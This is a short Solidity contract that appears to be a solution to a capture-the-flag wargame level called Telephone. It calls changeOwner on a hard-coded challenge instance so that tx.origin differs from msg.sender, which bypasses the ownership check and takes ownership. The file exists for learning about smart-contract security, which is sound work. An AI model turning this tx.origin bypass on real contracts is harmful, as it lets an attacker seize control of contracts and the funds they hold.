//calling a telephone, tx.origin != msg.sender

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Caller {
    address instAddr = 0x850dbA0eeF7De3151e6d74061200AC098cF6e201; //the addr of your instance

    function hi() external {
        ITelephone(instAddr).changeOwner(msg.sender);
    }
}